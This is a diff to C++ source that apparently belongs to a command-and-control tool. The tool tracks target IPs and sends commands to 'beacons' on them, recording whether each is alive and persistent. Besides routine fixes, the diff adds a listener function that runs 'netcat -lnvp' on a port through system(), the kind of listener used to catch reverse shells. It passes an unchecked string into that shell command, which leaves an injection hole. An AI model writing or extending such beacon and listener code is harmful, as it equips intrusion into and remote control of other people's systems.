@@ -1,6 +1,7 @@
 #include <iostream>
 #include <string>
 #include <tuple>
+#include <fstream>
 #include <sstream>
 #include <sys/socket.h>
 #include <arpa/inet.h>
@@ -15,7 +16,7 @@
 using json = nlohmann::json;
 
 std::tuple<std::string, int> get_beacon_data(sockaddr_in &sa, int &tid){
-    json config = getConfig();
+    json config = *getConfig();
     std::string ip_addr = config["targets"][tid]["ip"];
     return {ip_addr, config["targets"][tid]["beacon"]["port"]};
 }
@@ -48,7 +49,7 @@ void process(std::string reply, std::string ip, int port){
         std::cerr << "error executing command on beacon at [" << ip << "]\n";
     }
     std::cout << cout << std::endl;
-    json config = getConfig();
+    json config = *getConfig();
     config["targets"][id]["beacon"]["alive"] = alive;
     config["targets"][id]["beacon"]["persistent"] = persistent;
     setConfig(config);
@@ -75,4 +76,11 @@ void communicate(int tid, std::string update) {
     valread = read(sockfd, buf, 1024);
     std::string reply = std::string{buf}.substr(0,valread);
     process(reply, ip, port);
+    close(sockfd);
 }
+
+void listener(std::string p){
+    std::string nc_bin = get_binary("netcat");
+    std::string cmd = nc_bin + " -lnvp " + p;
+    system(cmd.c_str());
+};
